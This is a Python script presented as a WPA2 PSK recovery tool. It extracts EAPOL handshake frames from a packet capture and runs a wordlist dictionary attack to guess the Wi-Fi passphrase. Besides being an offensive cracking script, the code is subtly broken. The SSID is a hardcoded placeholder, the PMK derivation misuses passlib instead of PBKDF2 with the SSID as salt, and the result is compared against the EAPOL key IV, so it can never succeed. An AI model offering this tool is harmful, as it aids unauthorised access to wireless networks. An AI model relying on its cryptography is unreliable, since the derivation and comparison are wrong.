import argparse
import pyshark
from passlib.hash import pbkdf2_sha1
import hashlib
import binascii

# Function to extract handshake from pcap file
def extract_handshake(file):
    capture = pyshark.FileCapture(file, display_filter="eapol")
    eapol_frames = []

    for packet in capture:
        if 'eapol' in packet:
            eapol_frames.append(packet)

    capture.close()
    
    if len(eapol_frames) < 2:
        print("Handshake not found. Need at least two EAPOL frames.")
        return None

    return eapol_frames

# Function to extract needed information from handshake
def parse_handshake(eapol_frames):
    # Extract the required EAPOL frames (e.g., EAPOL 2 & 3 or 3 & 4)
    eapol_2 = eapol_frames[1]  # Assuming frames 2 and 3 contain the EAPOL messages
    eapol_3 = eapol_frames[2]

    # Extract the information from the frames (these are based on frame structure)
    # For real implementation, proper parsing of keys and other values is needed

    ssid = "YourSSID"  # Extract from the beacon or data frame in the pcap file
    psk_eapol = binascii.unhexlify(eapol_3.eapol_key.iv)  # Simplified example

    return ssid, psk_eapol

# Function to compute PMK and compare with the captured handshake
def compute_pmk(ssid, psk_candidate):
    # Compute PMK using PBKDF2-HMAC-SHA1 (as aircrack-ng does)
    pmk = pbkdf2_sha1.using(rounds=4096).hash(ssid.encode('utf-8') + psk_candidate.encode('utf-8'))
    return pmk

# Function to attempt the dictionary attack
def dictionary_attack(capture_file, wordlist):
    print(f"Loading capture file: {capture_file}")
    eapol_frames = extract_handshake(capture_file)

    if not eapol_frames:
        return

    ssid, psk_eapol = parse_handshake(eapol_frames)
    print(f"Attempting to recover PSK for SSID: {ssid}")

    with open(wordlist, 'r') as wordlist_file:
        for line in wordlist_file:
            psk_candidate = line.strip()
            print(f"Trying PSK: {psk_candidate}")

            pmk = compute_pmk(ssid, psk_candidate)
            # Compare PMK with the PSK from the EAPOL frame
            if pmk == psk_eapol:
                print(f"PSK found: {psk_candidate}")
                return

    print("No matching PSK found in the wordlist.")

# Main function to handle argument parsing
def main():
    parser = argparse.ArgumentParser(description="WPA2 PSK Recovery Tool using PyShark and Passlib")
    parser.add_argument('-f', '--file', required=True, help="Path to the .cap or .pcap file")
    parser.add_argument('-w', '--wordlist', required=True, help="Path to the wordlist file for dictionary attack")

    args = parser.parse_args()

    dictionary_attack(args.file, args.wordlist)

if __name__ == "__main__":
    main()
